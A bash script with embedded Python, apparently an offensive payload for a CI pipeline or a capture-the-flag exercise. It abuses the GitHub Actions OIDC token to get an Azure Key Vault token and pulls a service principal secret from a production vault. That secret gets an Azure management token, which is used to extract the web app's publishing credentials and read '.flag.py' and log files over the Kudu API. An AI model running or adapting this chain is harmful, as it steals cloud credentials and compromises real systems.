#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64,json,os,urllib.parse,urllib.request,urllib.error
TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; V='https://kv-tbl-prod-x3euoz.vault.azure.net'; APP='app-tbl-reporting-prod'; RG='rg-tbl-reporting-prod-eus'; ARM='https://management.azure.com'
def rq(u,m='GET',d=None,h=None,t=25):
 try:
  x=urllib.request.urlopen(urllib.request.Request(u,data=d,method=m,headers=h or {}),timeout=t); return x.status,x.read()
 except urllib.error.HTTPError as e:return e.code,e.read()
 except Exception as e:return 0,str(e).encode()
def jq(u,m='GET',o=None,tok='',t=25):
 h={'Content-Type':'application/json'}
 if tok:h['Authorization']='Bearer '+tok
 s,b=rq(u,m,json.dumps(o).encode() if o is not None else None,h,t)
 try:return s,json.loads(b.decode())
 except:return s,{'raw':b.decode(errors='replace')}
def fq(u,o,t=25):
 s,b=rq(u,'POST',urllib.parse.urlencode(o).encode(),{'Content-Type':'application/x-www-form-urlencoded'},t)
 try:return s,json.loads(b.decode())
 except:return s,{'raw':b.decode(errors='replace')}
base_oid=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); raw_oid=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
ou=base_oid+'&audience=api%3A%2F%2FAzureADTokenExchange'; s,b=rq(ou,h={'Authorization':'Bearer '+raw_oid}); oid=json.loads(b.decode()).get('value','') if s==200 else ''
s,d=fq(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token',{'client_id':CID,'grant_type':'client_credentials','scope':'https://vault.azure.net/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oid}); vt=d.get('access_token','')
s,d=jq(V+'/secrets/reporting-service-principal?api-version=7.4',tok=vt); sp=json.loads(d.get('value','{}')) if d.get('value') else {}
s,d=fq(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token',{'client_id':sp.get('appId',''),'grant_type':'client_credentials','client_secret':sp.get('clientSecret',''),'scope':'https://management.azure.com/.default'}); at=d.get('access_token','')
u=f'{ARM}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/{APP}/config/publishingcredentials/list?api-version=2023-01-01'; s,d=jq(u,'POST',{},at,30); p=d.get('properties',{}); ku=p.get('publishingUserName',''); kp=p.get('publishingPassword','')
print('pub',s,bool(ku),flush=True)
if not ku or not kp: raise SystemExit
a=base64.b64encode((ku+':'+kp).encode()).decode()
# CHI DOC - khong ghi, khong thuc thi gi het
for path in ['site/wwwroot/.flag.py','LogFiles']:
    u2=f'https://{APP}.scm.azurewebsites.net/api/vfs/{path}' + ('' if path.endswith('.py') else '/')
    s2,b2=rq(u2,'GET',None,{'Authorization':'Basic '+a},25)
    print('READ',path,s2,b2[:2000],flush=True)
PY
